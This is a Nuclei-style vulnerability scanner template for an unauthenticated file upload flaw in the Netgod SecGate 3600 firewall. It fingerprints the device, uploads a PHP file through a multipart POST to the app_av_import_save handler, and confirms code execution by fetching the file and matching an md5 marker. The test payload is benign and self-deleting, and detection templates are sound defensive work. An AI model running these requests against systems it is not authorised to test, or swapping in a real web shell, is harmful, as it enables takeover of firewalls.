id: netgod-secgate-3600-file-upload
info:
  name: Netgod SecGate 3600 Firewall File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Netgod SecGate 3600 firewall has a file upload vulnerability that allows attackers to gain server control permissions.
  reference:
    - https://www.legendsec.com/newsec.php?up=2&cid=63
  tags: file-upload
  classification:
    cvss-score: 10.0
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SecGate 3600"
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc

        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="MAX_FILE_SIZE"

        10000000
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="reqfile"; filename="test.php"
        Content-Type: text/plain

        <?php echo(md5(233)); unlink(__FILE__); ?>
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="submit_post"

        app_av_import_save
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
      - |
        GET /attachements/test.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "e165421110ba03099a1c0393373c5b43"
      - type: status
        status:
          - 200
